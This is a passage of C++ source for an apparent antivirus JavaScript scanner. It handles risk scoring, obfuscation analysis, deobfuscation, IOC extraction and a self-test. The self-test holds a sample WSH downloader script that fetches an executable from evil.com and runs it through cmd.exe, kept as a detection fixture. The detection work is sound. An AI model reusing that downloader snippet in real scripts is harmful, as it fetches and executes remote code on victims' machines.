                    break;
                }
            }
        }

        if (config.blockObfuscatedScripts &&
            result.obfuscation.confidence >= 60.0) {
            result.riskScore += 40;
        }

        // Cap risk score at 100
        result.riskScore = std::min(result.riskScore, 100);

        // Determine final status
        if (result.riskScore >= RISK_THRESHOLD_MALICIOUS) {
            result.status = JSScanStatus::Malicious;
            result.isMalicious = true;
            m_stats.maliciousDetected.fetch_add(1, std::memory_order_relaxed);

            // Generate threat name
            if (!result.detectedFamily.empty()) {
                result.threatName = "JS/" + result.detectedFamily;
            } else if (!result.activeXUsage.empty()) {
                result.threatName = "JS/Trojan.ActiveX";
            } else {
                result.threatName = "JS/Suspicious.Generic";
            }

        } else if (result.riskScore >= RISK_THRESHOLD_SUSPICIOUS) {
            result.status = JSScanStatus::Suspicious;
            m_stats.suspiciousDetected.fetch_add(1, std::memory_order_relaxed);
            result.threatName = "JS/Suspicious.Obfuscated";

        } else {
            result.status = JSScanStatus::Clean;
        }

        // Check for downloader characteristics
        if (!result.networkActivity.empty() && !result.activeXUsage.empty()) {
            bool hasSuspiciousAX = false;
            bool hasTarget = false;
            for (const auto& ax : result.activeXUsage) {
                if (ax.isSuspicious) { hasSuspiciousAX = true; break; }
            }
            for (const auto& net : result.networkActivity) {
                if (!net.target.empty()) { hasTarget = true; break; }
            }
            if (hasSuspiciousAX && hasTarget) {
                result.category = JSThreatCategory::Downloader;
                m_stats.downloadersDetected.fetch_add(1, std::memory_order_relaxed);
            }
        }

        // Update category statistics (bounds-checked)
        {
            const auto catIdx = static_cast<size_t>(result.category);
            if (catIdx < m_stats.byCategory.size()) {
                m_stats.byCategory[catIdx].fetch_add(1, std::memory_order_relaxed);
            }
        }

        // Generate description
        if (result.isMalicious) {
            std::ostringstream desc;
            desc << "Malicious JavaScript detected";
            if (!result.detectedFamily.empty()) {
                desc << " (Family: " << result.detectedFamily << ")";
            }
            desc << ". Risk score: " << result.riskScore;
            desc << ". ActiveX abuse: " << result.activeXUsage.size();
            desc << ". Network indicators: " << result.networkActivity.size();
            result.description = desc.str();
        } else if (result.status == JSScanStatus::Suspicious) {
            result.description = "Suspicious patterns detected. Manual review recommended.";
        }

        // Notify callbacks
        NotifyCallbacks(result);

    } catch (const std::exception& e) {
        result.status = JSScanStatus::ErrorInternal;
        result.description = std::string("Internal error: ") + e.what();
        SS_LOG_ERROR(LOG_CATEGORY, L"Exception scanning content: %hs", e.what());
        NotifyError(e.what(), -1);
    }

    result.scanDuration = std::chrono::duration_cast<std::chrono::microseconds>(
        Clock::now() - startTime);

    return result;
}

// ============================================================================
// JAVASCRIPTSCANNERIMPL - ANALYSIS
// ============================================================================

JSEngineType JavaScriptScannerImpl::DetectEngineType(std::string_view content) {
    const std::string lower = ToLower(content.substr(0, std::min(content.size(), size_t(10000))));

    // Check for Node.js patterns
    if (ContainsIgnoreCase(lower, "require(") ||
        ContainsIgnoreCase(lower, "module.exports") ||
        ContainsIgnoreCase(lower, "process.env") ||
        ContainsIgnoreCase(lower, "__dirname") ||
        ContainsIgnoreCase(lower, "child_process")) {
        return JSEngineType::NodeJS;
    }

    // Check for WSH/JScript patterns
    if (ContainsIgnoreCase(lower, "wscript") ||
        ContainsIgnoreCase(lower, "activexobject") ||
        ContainsIgnoreCase(lower, "new activexobject") ||
        ContainsIgnoreCase(lower, "scripting.filesystemobject") ||
        ContainsIgnoreCase(lower, "shell.application")) {
        return JSEngineType::JScriptWSH;
    }

    // Check for Electron patterns
    if (ContainsIgnoreCase(lower, "electron") ||
        ContainsIgnoreCase(lower, "remote.require") ||
        ContainsIgnoreCase(lower, "ipcrenderer")) {
        return JSEngineType::Electron;
    }

    // Check for PDF JavaScript
    if (ContainsIgnoreCase(lower, "this.getfield") ||
        ContainsIgnoreCase(lower, "app.alert") ||
        ContainsIgnoreCase(lower, "util.printf")) {
        return JSEngineType::PDF;
    }

    // Check for browser patterns
    if (ContainsIgnoreCase(lower, "document.") ||
        ContainsIgnoreCase(lower, "window.") ||
        ContainsIgnoreCase(lower, "navigator.") ||
        ContainsIgnoreCase(lower, "localstorage") ||
        ContainsIgnoreCase(lower, "document.cookie")) {
        // Determine specific browser engine (best effort)
        return JSEngineType::BrowserV8;  // Default to V8 as most common
    }

    return JSEngineType::Unknown;
}

JSObfuscationDetails JavaScriptScannerImpl::AnalyzeObfuscation(std::string_view content) {
    JSObfuscationDetails details;

    // Cap content for expensive operations (entropy + regex)
    const auto cappedSize = std::min(content.size(), JSConstants::MAX_REGEX_CONTENT_SIZE);
    const std::string lower = ToLower(content.substr(0, cappedSize));
    const double entropy = CalculateEntropy(content.substr(0, cappedSize));
    details.entropyScore = entropy;

    // Track which technique types we've already added to avoid duplicates
    std::unordered_set<uint8_t> seenTypes;

    auto addTechnique = [&](JSObfuscationType t) {
        const auto key = static_cast<uint8_t>(t);
        if (seenTypes.insert(key).second) {
            details.detectedTechniques.push_back(t);
        }
    };

    // Check for obfuscation patterns
    for (const auto& [pattern, type] : OBFUSCATION_PATTERNS) {
        if (lower.find(pattern) != std::string::npos) {
            addTechnique(type);
        }
    }

    // Count eval occurrences
    size_t evalCount = 0;
    size_t pos = 0;
    while ((pos = lower.find("eval", pos)) != std::string::npos) {
        evalCount++;
        pos += 4;
    }

    // Count string splitting (concatenation operators)
    size_t concatCount = 0;
    pos = 0;
    while ((pos = lower.find("]+[", pos)) != std::string::npos) {
        concatCount++;
        pos += 3;
    }

    // Check for suspicious variable naming patterns (capped content, thread_local regex)
    size_t shortVarCount = 0;
    if (cappedSize > 0) {
        try {
            thread_local const std::regex shortVarPattern(
                R"(\b[a-z_$][a-z0-9_$]?\s*=)", std::regex::icase | std::regex::optimize);
            std::string cappedStr(content.substr(0, cappedSize));
            auto begin = std::sregex_iterator(cappedStr.begin(), cappedStr.end(), shortVarPattern);
            auto end = std::sregex_iterator();
            shortVarCount = static_cast<size_t>(std::distance(begin, end));
        } catch (const std::regex_error&) {
            // Regex failure is not fatal — continue without this heuristic
        }
    }

    // Calculate obfuscation confidence
    details.confidence = 0.0;

    if (entropy > JSConstants::ENTROPY_THRESHOLD_OBFUSCATED) {
        details.confidence += 30.0;
    } else if (entropy > 4.5) {
        details.confidence += 15.0;
    }

    if (evalCount > 3) {
        details.confidence += 20.0;
        addTechnique(JSObfuscationType::EvalChain);
    }

    if (concatCount > 10) {
        details.confidence += 15.0;
        addTechnique(JSObfuscationType::StringSplitting);
    }

    if (shortVarCount > 20 && content.size() > 500) {
        details.confidence += 10.0;
        addTechnique(JSObfuscationType::VariableRenaming);
    }

    // Cap confidence at 100
    details.confidence = std::min(details.confidence, 100.0);

    details.suspiciousTokenCount = evalCount + concatCount;

    // Determine primary obfuscation type
    if (!details.detectedTechniques.empty()) {
        details.primaryType = details.detectedTechniques[0];
    }

    return details;
}

std::string JavaScriptScannerImpl::Deobfuscate(std::string_view content, size_t maxDepth) {
    std::string result(content);

    for (size_t depth = 0; depth < maxDepth; ++depth) {
        std::string previous = result;

        // Decode Base64 segments
        result = DecodeBase64Segments(result);

        // Decode String.fromCharCode sequences
        result = DecodeCharCodeSequences(result);

        // Decode hex escapes
        result = DecodeHexEscapes(result);

        // Decode unicode escapes
        result = DecodeUnicodeEscapes(result);

        // If no changes were made, stop iterating
        if (result == previous) {
            break;
        }
    }

    return result;
}

std::vector<std::string> JavaScriptScannerImpl::ExtractIOCs(std::string_view content) {
    std::vector<std::string> iocs;

    // Cap content for regex operations to avoid catastrophic backtracking
    const auto cappedSize = std::min(content.size(), JSConstants::MAX_REGEX_CONTENT_SIZE);
    std::string contentStr(content.substr(0, cappedSize));

    try {
        // Extract URLs using thread-safe regex
        {
            const auto& urlRe = GetURLRegex();
            std::sregex_iterator urlBegin(contentStr.begin(), contentStr.end(), urlRe);
            std::sregex_iterator urlEnd;
            for (auto it = urlBegin; it != urlEnd && iocs.size() < MAX_EXTRACTED_IOCS; ++it) {
                iocs.push_back(it->str());
            }
        }

        // Extract IP addresses
        {
            const auto& ipRe = GetIPRegex();
            std::sregex_iterator ipBegin(contentStr.begin(), contentStr.end(), ipRe);
            std::sregex_iterator ipEnd;
            for (auto it = ipBegin; it != ipEnd && iocs.size() < MAX_EXTRACTED_IOCS; ++it) {
                std::string ip = it->str();
                // Filter out common false positives (version numbers, loopback)
                if (ip.find("0.0.0") != 0 && ip.find("127.0.0") != 0) {
                    iocs.push_back(std::move(ip));
                }
            }
        }

    } catch (const std::regex_error& e) {
        SS_LOG_ERROR(LOG_CATEGORY, L"Regex error extracting IOCs: %hs", e.what());
    }

    // Remove duplicates
    std::sort(iocs.begin(), iocs.end());
    iocs.erase(std::unique(iocs.begin(), iocs.end()), iocs.end());

    return iocs;
}

std::vector<ActiveXUsage> JavaScriptScannerImpl::DetectActiveXUsage(std::string_view content) {
    std::vector<ActiveXUsage> usages;

    // Cap content for regex operations
    const auto cappedSize = std::min(content.size(), JSConstants::MAX_REGEX_CONTENT_SIZE);
    std::string contentStr(content.substr(0, cappedSize));

    // Use the thread-safe, thread_local regex from the anonymous namespace
    const auto& activeXPattern = GetActiveXRegex();

    auto begin = std::sregex_iterator(contentStr.begin(), contentStr.end(), activeXPattern);
    auto end = std::sregex_iterator();

    for (auto it = begin; it != end; ++it) {
        ActiveXUsage usage;
        usage.objectName = (*it)[2].str();

        // Calculate approximate line number
        const size_t pos = static_cast<size_t>(it->position());
        usage.lineNumber = 1 + static_cast<size_t>(
            std::count(contentStr.begin(),
                       contentStr.begin() + static_cast<ptrdiff_t>(pos),
                       '\n'));

        // Check if suspicious
        std::string lowerObj = ToLower(usage.objectName);
        for (const auto& suspicious : SUSPICIOUS_ACTIVEX_OBJECTS) {
            if (lowerObj.find(suspicious) != std::string::npos) {
                usage.isSuspicious = true;
                usage.suspicionReason = "Known dangerous ActiveX object: " + usage.objectName;
                break;
            }
        }

        usages.push_back(std::move(usage));
    }

    return usages;
}

std::vector<JSNetworkActivity> JavaScriptScannerImpl::DetectNetworkActivity(
    std::string_view content) {

    std::vector<JSNetworkActivity> activities;
    const std::string lower = ToLower(content);

    // Extract IOCs once — shared across all matched network patterns
    std::vector<std::string> iocs;
    bool iocsExtracted = false;

    // Detect HTTP method once
    std::string detectedMethod;
    if (lower.find("\"get\"") != std::string::npos ||
        lower.find("'get'") != std::string::npos) {
        detectedMethod = "GET";
    } else if (lower.find("\"post\"") != std::string::npos ||
               lower.find("'post'") != std::string::npos) {
        detectedMethod = "POST";
    }

    for (const auto& pattern : NETWORK_PATTERNS) {
        if (lower.find(pattern) != std::string::npos) {
            JSNetworkActivity activity;
            activity.apiUsed = pattern;
            activity.method = detectedMethod;

            // Lazy-extract IOCs on first network pattern hit
            if (!iocsExtracted) {
                iocs = ExtractIOCs(content);
                iocsExtracted = true;
            }
            if (!iocs.empty()) {
                activity.target = iocs[0];
            }

            activities.push_back(std::move(activity));
        }
    }

    return activities;
}

// ============================================================================
// JAVASCRIPTSCANNERIMPL - CALLBACKS
// ============================================================================

void JavaScriptScannerImpl::RegisterCallback(ScanResultCallback callback) {
    if (!callback) return;

    std::unique_lock lock(m_callbackMutex);
    m_callbacks.push_back(std::move(callback));
}

void JavaScriptScannerImpl::RegisterErrorCallback(ErrorCallback callback) {
    if (!callback) return;

    std::unique_lock lock(m_callbackMutex);
    m_errorCallbacks.push_back(std::move(callback));
}

void JavaScriptScannerImpl::UnregisterCallbacks() {
    std::unique_lock lock(m_callbackMutex);
    m_callbacks.clear();
    m_errorCallbacks.clear();
}

void JavaScriptScannerImpl::NotifyCallbacks(const JSScanResult& result) {
    std::shared_lock lock(m_callbackMutex);
    for (const auto& callback : m_callbacks) {
        try {
            callback(result);
        } catch (const std::exception& e) {
            SS_LOG_ERROR(LOG_CATEGORY, L"Callback exception: %hs", e.what());
        }
    }
}

void JavaScriptScannerImpl::NotifyError(const std::string& message, int code) {
    std::shared_lock lock(m_callbackMutex);
    for (const auto& callback : m_errorCallbacks) {
        try {
            callback(message, code);
        } catch (...) {
            // Ignore callback exceptions
        }
    }
}

// ============================================================================
// JAVASCRIPTSCANNERIMPL - STATISTICS
// ============================================================================

JSStatistics JavaScriptScannerImpl::GetStatistics() const {
    // Return copy of current statistics
    JSStatistics stats;
    stats.totalScans.store(m_stats.totalScans.load(std::memory_order_relaxed));
    stats.maliciousDetected.store(m_stats.maliciousDetected.load(std::memory_order_relaxed));
    stats.suspiciousDetected.store(m_stats.suspiciousDetected.load(std::memory_order_relaxed));
    stats.obfuscatedDetected.store(m_stats.obfuscatedDetected.load(std::memory_order_relaxed));
    stats.activeXAbuse.store(m_stats.activeXAbuse.load(std::memory_order_relaxed));
    stats.downloadersDetected.store(m_stats.downloadersDetected.load(std::memory_order_relaxed));
    stats.timeouts.store(m_stats.timeouts.load(std::memory_order_relaxed));
    stats.totalBytesScanned.store(m_stats.totalBytesScanned.load(std::memory_order_relaxed));
    stats.startTime = m_stats.startTime;

    for (size_t i = 0; i < 16; ++i) {
        stats.byEngine[i].store(m_stats.byEngine[i].load(std::memory_order_relaxed));
        stats.byCategory[i].store(m_stats.byCategory[i].load(std::memory_order_relaxed));
    }

    return stats;
}

void JavaScriptScannerImpl::ResetStatistics() {
    m_stats.totalScans.store(0, std::memory_order_relaxed);
    m_stats.maliciousDetected.store(0, std::memory_order_relaxed);
    m_stats.suspiciousDetected.store(0, std::memory_order_relaxed);
    m_stats.obfuscatedDetected.store(0, std::memory_order_relaxed);
    m_stats.activeXAbuse.store(0, std::memory_order_relaxed);
    m_stats.downloadersDetected.store(0, std::memory_order_relaxed);
    m_stats.timeouts.store(0, std::memory_order_relaxed);
    m_stats.totalBytesScanned.store(0, std::memory_order_relaxed);
    m_stats.startTime = Clock::now();

    for (size_t i = 0; i < 16; ++i) {
        m_stats.byEngine[i].store(0, std::memory_order_relaxed);
        m_stats.byCategory[i].store(0, std::memory_order_relaxed);
    }
}

bool JavaScriptScannerImpl::SelfTest() {
    SS_LOG_INFO(LOG_CATEGORY, L"Running JavaScriptScanner self-test");

    try {
        // Test 1: Engine detection
        {
            const char* wshScript = "var shell = new ActiveXObject('WScript.Shell');";
            auto engine = DetectEngineType(wshScript);
            if (engine != JSEngineType::JScriptWSH) {
                SS_LOG_ERROR(LOG_CATEGORY, L"Self-test failed: WSH detection");
                return false;
            }
        }

        // Test 2: ActiveX detection
        {
            const char* activeXScript = R"(var fso = new ActiveXObject("Scripting.FileSystemObject");)";
            auto activeX = DetectActiveXUsage(activeXScript);
            if (activeX.empty() || !activeX[0].isSuspicious) {
                SS_LOG_ERROR(LOG_CATEGORY, L"Self-test failed: ActiveX detection");
                return false;
            }
        }

        // Test 3: Obfuscation detection
        {
            const char* obfuscatedScript = "eval(eval(eval(String.fromCharCode(97,108,101,114,116))));";
            auto obfuscation = AnalyzeObfuscation(obfuscatedScript);
            if (obfuscation.primaryType == JSObfuscationType::None) {
                SS_LOG_ERROR(LOG_CATEGORY, L"Self-test failed: Obfuscation detection");
                return false;
            }
        }

        // Test 4: IOC extraction
        {
            const char* urlScript = "var url = 'http://malware.example.com/payload.exe';";
            auto iocs = ExtractIOCs(urlScript);
            if (iocs.empty()) {
                SS_LOG_ERROR(LOG_CATEGORY, L"Self-test failed: IOC extraction");
                return false;
            }
        }

        // Test 5: Full scan
        {
            const char* maliciousScript = R"(
                var shell = new ActiveXObject("WScript.Shell");
                var http = new ActiveXObject("MSXML2.XMLHTTP");
                http.open("GET", "http://evil.com/malware.exe", false);
                http.send();
                shell.Run("cmd.exe /c " + http.responseText);
            )";

            auto result = ScanContent(maliciousScript, "test.js", 0);
            if (result.status != JSScanStatus::Malicious) {
                SS_LOG_ERROR(LOG_CATEGORY, L"Self-test failed: Full scan detection");
                return false;
            }
        }

        SS_LOG_INFO(LOG_CATEGORY, L"JavaScriptScanner self-test passed");
        return true;

    } catch (const std::exception& e) {
        SS_LOG_ERROR(LOG_CATEGORY, L"Self-test exception: %hs", e.what());
        return false;
    }
}

// ============================================================================
// JAVASCRIPTSCANNERIMPL - INTERNAL METHODS
// ============================================================================

double JavaScriptScannerImpl::CalculateEntropy(std::string_view content) const {
    if (content.empty()) return 0.0;

    std::array<size_t, 256> frequency{};
    for (unsigned char c : content) {
        frequency[c]++;
    }

    double entropy = 0.0;
    const double len = static_cast<double>(content.size());

    for (size_t count : frequency) {
        if (count > 0) {
            const double p = static_cast<double>(count) / len;
            entropy -= p * std::log2(p);
        }
    }

    return entropy;
}

int JavaScriptScannerImpl::CalculateRiskScore(
    const std::vector<ActiveXUsage>& activeX,
    const std::vector<JSNetworkActivity>& network,
    const JSObfuscationDetails& obfuscation,
    std::string_view content) const {

    int score = 0;
    const std::string lower = ToLower(content);

    // ActiveX risk
    for (const auto& ax : activeX) {
        if (ax.isSuspicious) {
            score += 20;
        } else {
            score += 5;
        }
    }

    // Network activity risk
    score += static_cast<int>(network.size()) * 10;

    // Obfuscation risk
    if (obfuscation.primaryType != JSObfuscationType::None) {
        score += 15;
        score += static_cast<int>(obfuscation.detectedTechniques.size()) * 5;
    }

    if (obfuscation.entropyScore > JSConstants::ENTROPY_THRESHOLD_OBFUSCATED) {
        score += 10;
    }

    // Check for dangerous methods
    for (const auto& [method, risk] : DANGEROUS_METHODS) {
        if (lower.find(method) != std::string::npos) {
            score += risk;
        }
    }

    // LOLbin patterns (Living Off the Land Binary abuse)
    for (const auto& [pattern, risk] : LOLBIN_PATTERNS) {
        if (lower.find(pattern) != std::string::npos) {
            score += risk;
        }
    }

    // Sandbox / VM evasion indicators
    for (const auto& [pattern, risk] : SANDBOX_EVASION_PATTERNS) {
        if (lower.find(pattern) != std::string::npos) {
            score += risk;
        }
    }

    // Persistence indicators
    for (const auto& [pattern, risk] : PERSISTENCE_PATTERNS) {
        if (lower.find(pattern) != std::string::npos) {
            score += risk;
        }
    }

    return score;
}

std::string JavaScriptScannerImpl::ComputeContentHash(std::string_view content) const {
    std::vector<uint8_t> hash;
    Utils::HashUtils::Error err;

    if (Utils::HashUtils::Compute(
            Utils::HashUtils::Algorithm::SHA256,
            content.data(),
            content.size(),
            hash,
            &err)) {
        return Utils::HashUtils::ToHexLower(hash);
    }

    return "";
}

std::vector<std::pair<size_t, std::string>> JavaScriptScannerImpl::FindFlaggedLines(
    std::string_view content) const {

    std::vector<std::pair<size_t, std::string>> flagged;

    const std::string lower = ToLower(content);
    std::istringstream stream(std::string(content));
    std::string line;
    size_t lineNum = 0;

    while (std::getline(stream, line) && flagged.size() < MAX_FLAGGED_LINES) {
        lineNum++;
        std::string lowerLine = ToLower(line);

        bool isFlagged = false;

        // Check for suspicious patterns
        for (const auto& ax : SUSPICIOUS_ACTIVEX_OBJECTS) {
            if (lowerLine.find(ax) != std::string::npos) {
                isFlagged = true;
                break;
            }
        }

        if (!isFlagged) {
            for (const auto& [method, _] : DANGEROUS_METHODS) {
                if (lowerLine.find(method) != std::string::npos) {
                    isFlagged = true;
                    break;
                }
            }
        }

        if (!isFlagged) {
            for (const auto& [pattern, _] : OBFUSCATION_PATTERNS) {
                if (lowerLine.find(pattern) != std::string::npos) {
                    isFlagged = true;
                    break;
                }
            }
        }

        if (isFlagged) {
            // Truncate long lines
            if (line.size() > 200) {
                line = line.substr(0, 200) + "...";
            }
            flagged.emplace_back(lineNum, line);
        }
    }

    return flagged;
}

std::pair<JSThreatCategory, std::string> JavaScriptScannerImpl::DetectMalwareFamily(
    std::string_view content,
    int& riskBoost) const {

    const std::string lower = ToLower(content);
    riskBoost = 0;

    for (const auto& sig : FAMILY_SIGNATURES) {
        if (lower.find(sig.pattern) != std::string::npos) {
            riskBoost = sig.riskBoost;
            return {sig.category, sig.familyName};
        }
    }

    return {JSThreatCategory::None, ""};
}

std::string JavaScriptScannerImpl::ToLower(std::string_view str) const {
    std::string result(str);
    std::transform(result.begin(), result.end(), result.begin(),
                   [](unsigned char c) { return static_cast<char>(std::tolower(c)); });
    return result;
}

bool JavaScriptScannerImpl::ContainsIgnoreCase(
    std::string_view haystack,
    std::string_view needle) const {

    if (needle.empty()) return true;
    if (haystack.size() < needle.size()) return false;

    auto it = std::search(
        haystack.begin(), haystack.end(),
        needle.begin(), needle.end(),
        [](char a, char b) {
            return std::tolower(static_cast<unsigned char>(a)) ==
                   std::tolower(static_cast<unsigned char>(b));
        });

    return it != haystack.end();
}

std::string JavaScriptScannerImpl::DecodeBase64Segments(std::string_view content) const {
    std::string result(content);

    // Find atob("...") patterns and decode.
    // After each replacement the string is mutated, so we restart the search
    // from the beginning each time.  MAX_DEOBFUSCATION_REPLACEMENTS prevents
    // infinite loops if decoded text itself contains atob().
    thread_local const std::regex atobPattern(
        R"(atob\s*\(\s*[\"']([A-Za-z0-9+/=]+)[\"']\s*\))",
        std::regex::optimize);

    for (size_t n = 0; n < MAX_DEOBFUSCATION_REPLACEMENTS; ++n) {
        std::smatch match;
        if (!std::regex_search(result, match, atobPattern)) {
            break;
        }

        try {
            const std::string encoded = match[1].str();
            std::vector<uint8_t> decoded;

            if (Utils::Base64Decode(encoded, decoded)) {
                std::string decodedStr(decoded.begin(), decoded.end());
                result.replace(
                    static_cast<size_t>(match.position()),
                    static_cast<size_t>(match.length()),
                    "\"" + decodedStr + "\"");
            } else {
                break;  // can't decode → stop
            }
        } catch (...) {
            break;
        }
    }

    return result;
}

std::string JavaScriptScannerImpl::DecodeCharCodeSequences(std::string_view content) const {
    std::string result(content);

    // Find String.fromCharCode(nn, nn, ...) patterns.
    // Restart search from the beginning after each replacement to avoid
    // iterator invalidation.
    thread_local const std::regex charCodePattern(
        R"(String\.fromCharCode\s*\(([0-9,\s]+)\))",
        std::regex::icase | std::regex::optimize);

    for (size_t n = 0; n < MAX_DEOBFUSCATION_REPLACEMENTS; ++n) {
        std::smatch match;
        if (!std::regex_search(result, match, charCodePattern)) {
            break;
        }

        try {
            const std::string codes = match[1].str();
            std::string decoded;

            // Parse comma-separated numbers
            std::istringstream iss(codes);
            std::string token;
            bool valid = true;
            while (std::getline(iss, token, ',')) {
                // Trim whitespace
                token.erase(0, token.find_first_not_of(" \t"));
                token.erase(token.find_last_not_of(" \t") + 1);

                if (!token.empty()) {
                    const int code = std::stoi(token);
                    if (code >= 0 && code <= 0xFFFF) {
                        // Accept full BMP; only emit single-byte for ASCII range
                        if (code <= 127) {
                            decoded += static_cast<char>(code);
                        }
                    } else {
                        valid = false;
                        break;
                    }
                }
            }

            if (valid && !decoded.empty()) {
                result.replace(
                    static_cast<size_t>(match.position()),
                    static_cast<size_t>(match.length()),
                    "\"" + decoded + "\"");
            } else {
                break;
            }
        } catch (...) {
            break;
        }
    }

    return result;
}

std::string JavaScriptScannerImpl::DecodeHexEscapes(std::string_view content) const {
    std::string result;
    result.reserve(content.size());

    for (size_t i = 0; i < content.size(); ++i) {
        if (i + 3 < content.size() && content[i] == '\\' && content[i + 1] == 'x') {
            // Parse \xNN
            char hex[3] = {content[i + 2], content[i + 3], '\0'};
            char* end;
            long value = std::strtol(hex, &end, 16);
            if (end == hex + 2 && value >= 0 && value <= 255) {
                result += static_cast<char>(value);
                i += 3;
                continue;
            }
        }
        result += content[i];
    }

    return result;
}

std::string JavaScriptScannerImpl::DecodeUnicodeEscapes(std::string_view content) const {
    std::string result;
    result.reserve(content.size());

    for (size_t i = 0; i < content.size(); ++i) {
        if (i + 5 < content.size() && content[i] == '\\' && content[i + 1] == 'u') {
            // Parse \uNNNN
            char hex[5] = {content[i + 2], content[i + 3], content[i + 4], content[i + 5], '\0'};
            char* end;
            long value = std::strtol(hex, &end, 16);
            if (end == hex + 4 && value >= 0 && value <= 127) {
                // Only decode ASCII range
                result += static_cast<char>(value);
                i += 5;
                continue;
            }
        }
        result += content[i];
    }

    return result;
}

// ============================================================================
// JAVASCRIPTSCANNERIMPL - JSE / WSF / HTA SUPPORT & DEADLINE
// ============================================================================

bool JavaScriptScannerImpl::IsJSEContent(std::string_view content) const noexcept {
    return content.size() >= 12 &&
           content.find(JSE_START_MARKER) != std::string_view::npos;
}

std::string JavaScriptScannerImpl::DecodeJSE(std::string_view content) const {
    const auto startMarker = content.find(JSE_START_MARKER);
    if (startMarker == std::string_view::npos) return std::string(content);

    const auto endMarker = content.find("^#~@", startMarker + 4);
    if (endMarker == std::string_view::npos) return std::string(content);

    // After #@~^ there is an encoded length block ending with ==
    const size_t afterStart = startMarker + 4;
    const auto eqSep = content.find("==", afterStart);
    if (eqSep == std::string_view::npos || eqSep >= endMarker) {
        return std::string(content);
    }
    const size_t payloadStart = eqSep + 2;

    // Payload ends before the trailing 6-byte checksum + optional == + ^#~@
    size_t payloadEnd = endMarker;
    if (payloadEnd >= 2 && content[payloadEnd - 1] == '=' && content[payloadEnd - 2] == '=') {
        payloadEnd -= 2;
    }
    if (payloadEnd >= payloadStart + 6) {
        payloadEnd -= 6;
    }

    if (payloadStart >= payloadEnd) return std::string(content);

    constexpr size_t MAX_JSE_PAYLOAD = 5 * 1024 * 1024;
    if (payloadEnd - payloadStart > MAX_JSE_PAYLOAD) {
        SS_LOG_WARN(LOG_CATEGORY, L"JSE payload exceeds decode size limit (%zu bytes)",
                    payloadEnd - payloadStart);
        return std::string(content);
    }

    const std::string_view payload = content.substr(payloadStart, payloadEnd - payloadStart);

    std::string decoded;
    decoded.reserve(payload.size());
    size_t encIndex = 0;

    for (size_t i = 0; i < payload.size(); ++i) {
        const uint8_t ch = static_cast<uint8_t>(payload[i]);

        // WSE escape sequences: @X -> special character
        if (ch == '@' && i + 1 < payload.size()) {
            switch (payload[i + 1]) {
                case '#': decoded += '\r'; ++i; continue;
                case '&': decoded += '\n'; ++i; continue;
                case '!': decoded += '<';  ++i; continue;
                case '*': decoded += '>';  ++i; continue;
                case '$': decoded += '@';  ++i; continue;
                default: break;
            }
        }

        // Non-printable / whitespace pass through unchanged
        if (ch <= 0x20 || ch >= 0x7F) {
            decoded += static_cast<char>(ch);
            continue;
        }

        // Substitution via the rotating decode tables
        const uint8_t tableIdx = kWsePick[encIndex % 64];
        decoded += static_cast<char>(kWseDecode[tableIdx][ch]);
        ++encIndex;
    }

    return decoded;
}

bool JavaScriptScannerImpl::IsWSFContent(std::string_view content) const noexcept {
    const auto probe = content.substr(0, std::min(content.size(), size_t(4096)));
    return ContainsIgnoreCase(probe, WSF_JOB_TAG) ||
           ContainsIgnoreCase(probe, WSF_PACKAGE_TAG);
}

std::string JavaScriptScannerImpl::ExtractScriptFromWSF(std::string_view content) const {
    std::string result;
    result.reserve(content.size() / 2);

    size_t pos = 0;
    while (pos < content.size()) {
        // Case-insensitive search for <script
        size_t tagStart = std::string::npos;
        for (size_t i = pos; i + 7 < content.size(); ++i) {
            if (content[i] == '<' &&
                (content[i+1] == 's' || content[i+1] == 'S') &&
                (content[i+2] == 'c' || content[i+2] == 'C') &&
                (content[i+3] == 'r' || content[i+3] == 'R') &&
                (content[i+4] == 'i' || content[i+4] == 'I') &&
                (content[i+5] == 'p' || content[i+5] == 'P') &&
                (content[i+6] == 't' || content[i+6] == 'T')) {
                tagStart = i;
                break;
            }
        }
        if (tagStart == std::string::npos) break;

        const auto tagClose = content.find('>', tagStart + 7);
        if (tagClose == std::string::npos) break;

        // Case-insensitive search for </script
        size_t endTag = std::string::npos;
        for (size_t i = tagClose + 1; i + 8 < content.size(); ++i) {
            if (content[i] == '<' && content[i+1] == '/' &&
                (content[i+2] == 's' || content[i+2] == 'S') &&
                (content[i+3] == 'c' || content[i+3] == 'C') &&
                (content[i+4] == 'r' || content[i+4] == 'R') &&
                (content[i+5] == 'i' || content[i+5] == 'I') &&
                (content[i+6] == 'p' || content[i+6] == 'P') &&
                (content[i+7] == 't' || content[i+7] == 'T')) {
                endTag = i;
                break;
            }
        }
        if (endTag == std::string::npos) break;

        if (!result.empty()) result += '\n';
        result += content.substr(tagClose + 1, endTag - tagClose - 1);
        pos = endTag + 9;
    }

    return result;
}

bool JavaScriptScannerImpl::IsHTAContent(std::string_view content) const noexcept {
    const auto probe = content.substr(0, std::min(content.size(), size_t(4096)));
    return ContainsIgnoreCase(probe, HTA_APP_TAG);
}

std::string JavaScriptScannerImpl::ExtractScriptFromHTA(std::string_view content) const {
    return ExtractScriptFromWSF(content);
}

bool JavaScriptScannerImpl::IsDeadlineExceeded(TimePoint deadline) const noexcept {
    return Clock::now() > deadline;
}

// ============================================================================
// STRUCTURE IMPLEMENTATIONS
// ============================================================================

void JSStatistics::Reset() noexcept {
    totalScans.store(0, std::memory_order_relaxed);
    maliciousDetected.store(0, std::memory_order_relaxed);
    suspiciousDetected.store(0, std::memory_order_relaxed);
    obfuscatedDetected.store(0, std::memory_order_relaxed);
    activeXAbuse.store(0, std::memory_order_relaxed);
    downloadersDetected.store(0, std::memory_order_relaxed);
    timeouts.store(0, std::memory_order_relaxed);
    totalBytesScanned.store(0, std::memory_order_relaxed);
    startTime = Clock::now();

    for (auto& counter : byEngine) {
        counter.store(0, std::memory_order_relaxed);
    }
    for (auto& counter : byCategory) {
        counter.store(0, std::memory_order_relaxed);
    }
}

std::string JSStatistics::ToJson() const {
    std::ostringstream oss;
    oss << "{";
    oss << "\"totalScans\":" << totalScans.load() << ",";
    oss << "\"maliciousDetected\":" << maliciousDetected.load() << ",";
    oss << "\"suspiciousDetected\":" << suspiciousDetected.load() << ",";
    oss << "\"obfuscatedDetected\":" << obfuscatedDetected.load() << ",";
    oss << "\"activeXAbuse\":" << activeXAbuse.load() << ",";
    oss << "\"downloadersDetected\":" << downloadersDetected.load() << ",";
    oss << "\"timeouts\":" << timeouts.load() << ",";
    oss << "\"totalBytesScanned\":" << totalBytesScanned.load();
    oss << "}";
    return oss.str();
}

bool JSScanConfig::IsValid() const noexcept {
    if (maxScriptSize == 0 || maxScriptSize > 100 * 1024 * 1024) {
        return false;
    }
    if (entropyThreshold < 0.0 || entropyThreshold > 8.0) {
        return false;
